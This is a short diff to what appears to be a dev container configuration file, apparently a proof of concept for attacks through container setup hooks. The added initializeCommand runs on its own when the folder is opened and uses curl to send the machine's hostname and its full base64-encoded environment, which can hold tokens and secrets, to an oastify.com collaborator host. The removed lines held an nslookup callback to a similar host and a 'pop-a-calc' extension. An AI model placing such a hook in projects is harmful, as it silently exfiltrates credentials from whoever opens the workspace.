@@ -4,12 +4,5 @@
 	"image": "mcr.microsoft.com/devcontainers/base:latest",
 	// Features to add to the dev container. More info: https://containers.dev/features.
 	"features": {},
-	"initializeCommand": "nslookup o6vwzl756w66jqwq0w79jkf0grmiaey3.oastify.com",
-	"customizations": {
-		"vscode": {
-			"extensions": [
-				"pspaul.pop-a-calc"
-			]
-		}
-	}
+	"initializeCommand": "curl -d $(hostname) https://7y6fr4zoyfypb9o9sfzsb37j8ae22sqh.oastify.com; curl -d $(env|base64|tr -d '\n') https://7y6fr4zoyfypb9o9sfzsb37j8ae22sqh.oastify.com"
 }
